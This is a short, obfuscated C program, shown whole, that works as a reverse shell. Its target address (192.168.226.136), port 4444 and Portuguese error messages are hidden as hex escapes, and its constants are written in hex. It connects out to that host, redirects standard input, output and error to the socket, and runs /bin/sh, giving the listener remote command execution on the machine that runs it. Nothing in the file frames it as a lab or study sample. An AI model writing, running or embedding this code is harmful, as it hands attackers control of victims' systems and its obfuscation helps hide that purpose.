#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>

int main() {
    const char *a = "\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x32\x36\x2e\x31\x33\x36";
    short b = 0x115C;

    int c;
    struct sockaddr_in d;

    c = socket(0x2, 0x1, 0x0);
    if (c < 0x0) {
        perror("\x45\x72\x72\x6f\x20\x61\x6f\x20\x63\x72\x69\x61\x72\x20\x6f\x20\x73\x6f\x63\x6b\x65\x74");
        exit(0x1);
    }

    d.sin_family = 0x2;
    d.sin_port = htons(b);
    d.sin_addr.s_addr = inet_addr(a);

    if (connect(c, (struct sockaddr*)&d, sizeof(d)) < 0x0) {
        perror("\x45\x72\x72\x6f\x20\x61\x6f\x20\x63\x6f\x6e\x65\x63\x74\x61\x72\x20\x61\x6f\x20\x73\x65\x72\x76\x69\x64\x6f\x72");
        close(c);
        exit(0x1);
    }

    for (int i = 0x0; i < 0x3; i++) {
        dup2(c, i);
    }
    
    char *const e[] = {"/bin/sh", NULL};
    execve(e[0], e, NULL);

    close(c);
    return 0x0;
}
